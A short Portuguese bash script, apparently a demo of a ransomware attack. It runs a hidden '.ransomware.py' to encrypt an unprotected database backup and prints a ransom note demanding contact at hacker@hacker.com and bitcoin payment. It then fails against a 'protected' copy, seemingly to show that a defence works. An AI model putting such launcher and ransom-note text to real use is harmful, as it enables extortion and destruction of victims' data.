#/bin/bash

desprotegido="/home/ubuntu/arquivos_muito_importantes_desprotegidos/BACKUP_DB.sql"
protegido="/home/ubuntu/arquivos_muito_importantes_protegidos/BACKUP_DB.sql"

echo "Arquivos encontrados. Iniciando roubo..."
echo "Encriptando " $desprotegido " ..."
python3 .ransomware.py -e $desprotegido

echo "Arquivos encriptados: " + $desprotegido
echo "Para reaver seus dados, favor enviar um e-mail para: hacker@hacker.com informando o seguinte código: 05324975SDA."
echo "Assim que recebermos sua mensagem enviaremos um link para o depósito em bitcoins a ser informado. Obrigado."

echo " "
echo "Encriptando " $protegido " ..."
python3 .ransomware.py -e $protegido
echo "ERRO!! O que está acontecendo?"

echo "Não foi possível criptografar e roubar seus dados!!!"
